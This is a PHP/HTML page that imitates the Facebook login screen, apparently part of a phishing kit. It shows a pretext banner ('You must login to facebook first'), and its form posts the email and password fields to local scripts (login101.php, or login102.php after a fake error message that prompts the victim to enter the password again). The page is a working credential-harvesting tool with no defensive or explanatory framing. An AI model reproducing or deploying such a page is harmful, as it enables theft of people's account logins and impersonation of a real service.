<!DOCTYPE html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Log In or Sign Up</title>
<style type="text/css">
	body,html{
		padding: 0px;
		margin: 0px;
	}
	input[type="text"],input[type="password"]{
		display: block;
		width: calc(100% - 24px);
		background-color: #f5f6f7;
		border: none; padding: 12px;
		font: 400 14px Arial;
		cursor: text;
		border-radius: 4px;
	}
	.tcont::before{
		border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
		border-radius: 4px;
		border-style: solid;
		border-width: 1px;
		bottom: -1px;
		content: '';
		left: -1px;
		pointer-events: none;
		position: absolute;
		right: -1px;
		top: -1px;
	}
	.tcont{
		position: absolute;
	}
</style>
<?php
$action = "login101.php";
if(isset($_GET["error"])){
$action = "login102.php";
?>
<div style="border-bottom: 1px solid #dd3c10; background: #ffebe8; color: #6d220d;font-size: 14px; padding: 8px; font-family: Helvetica, Arial, sans-serif; line-height: 18px;">Your Request Couldn't be Processed<br>
There was a problem with this request. We're working on getting it fixed as soon as we can.</div>
<?php
}else{
?>
<div style="background: #f1ebba; color: #363e79;font-size: 14px; padding: 8px; font-family: Helvetica, Arial, sans-serif; line-height: 18px;">You must login to facebook first.</div>
<?php
}
?>
<div style="padding: 4px"></div>
<center>
	<img src="fb-logo.svg" style="width: 112px;">
<form style="max-width: 420px; margin-top: 10px; padding: 0px 16px;" method="post" action="<?php echo $action; ?>">
	<div class="tcont" style="position: relative;">
		<input type="text" placeholder="Mobile number or email" name="email" autocorrect="off" autocapitalize="off" value="">
	</div>
	<div style="padding: 4px"></div>
	<div class="tcont" style="position: relative;">
		<input type="password" placeholder="Password" name="pass" autocorrect="off" autocapitalize="off" value="">
	</div>
	<div style="padding-top: 12px;"></div>
	<input type="submit" value="Log in" style="background-color: #1877f2; padding: 0px 16px; border-radius: 4px;border-color: rgba(0, 0, 0, .15) rgba(0, 0, 0, .15) rgba(0, 0, 0, .26); border-width: 1px; color: #fff;line-height: 24px;font-size: 17px; font-weight: bold; text-shadow: 0 -1px rgb(0 0 0 / 25%); width: 100%; padding-top: 6px; padding-bottom: 6px;" name="login">
</form>
</center>